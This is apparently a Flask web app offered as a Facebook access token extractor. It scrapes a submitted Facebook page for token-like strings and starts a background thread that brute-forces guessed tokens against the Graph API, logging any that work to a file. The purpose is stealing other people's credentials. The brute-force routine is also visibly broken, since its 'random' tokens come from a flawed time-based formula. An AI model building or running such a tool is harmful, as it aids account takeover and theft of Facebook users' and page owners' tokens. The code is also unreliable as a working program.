from flask import Flask, render_template, request, jsonify
import requests
import re
import threading
import time
from bs4 import BeautifulSoup

app = Flask(__name__)

@app.route('/')
def dashboard():
    return render_template('index.html')

@app.route('/extract', methods=['POST'])
def extract_token():
    fb_url = request.json.get('url', '')
    
    if 'facebook.com' not in fb_url:
        return jsonify({'error': 'Valid FB URL daalo bhai!'})
    
    # Method 1: URL parsing
    page_id = extract_page_id(fb_url)
    
    # Method 2: Live scraping + token hunting
    tokens = scrape_fb_page(fb_url)
    
    # Method 3: Graph API brute (background)
    threading.Thread(target=brute_graph_tokens, args=(page_id,)).start()
    
    return jsonify({
        'success': True,
        'url': fb_url,
        'page_id': page_id,
        'tokens': tokens,
        'status': 'Extracting... Check panel in 10sec'
    })

def extract_page_id(url):
    patterns = [
        r'facebook\.com/[^/]+/posts/(\d+)',
        r'facebook\.com/pages/[^/]+/(\d+)',
        r'facebook\.com/(\d+)',
        r'facebook\.com/profile\.php\?id=(\d+)'
    ]
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    return 'unknown'

def scrape_fb_page(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Token hunting patterns
        token_patterns = [
            r'EAA[A-Za-z0-9]{60,80}',
            r'access_token["\']?\s*[:=]\s*["\']?([A-Za-z0-9]+)',
            r'graph\.facebook\.com.*?access_token["\']?\s*[:=]\s*["\']?([A-Za-z0-9]+)'
        ]
        
        all_text = str(soup)
        tokens = []
        for pattern in token_patterns:
            matches = re.findall(pattern, all_text, re.IGNORECASE)
            tokens.extend(matches)
        
        return list(set([t for t in tokens if len(t) > 50]))  # Filter valid length
        
    except:
        return []

def brute_graph_tokens(page_id):
    # Background token generation + testing
    prefixes = ['EAAAD6V7', 'EAA', 'EAAG']
    for prefix in prefixes:
        for i in range(1000):  # Fast brute
            token = f"{prefix}{''.join([chr(65+int(time.time()%26+i)%26) for _ in range(64)])}"
            test_token(page_id, token)

def test_token(page_id, token):
    try:
        url = f"https://graph.facebook.com/{page_id}?fields=name&access_token={token}"
        r = requests.get(url, timeout=2)
        if r.status_code == 200:
            print(f"🎉 VALID TOKEN FOUND: {token}")
            # Save to file/database for panel
            with open('valid_tokens.txt', 'a') as f:
                f.write(f"{token}\n")
    except:
        pass

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
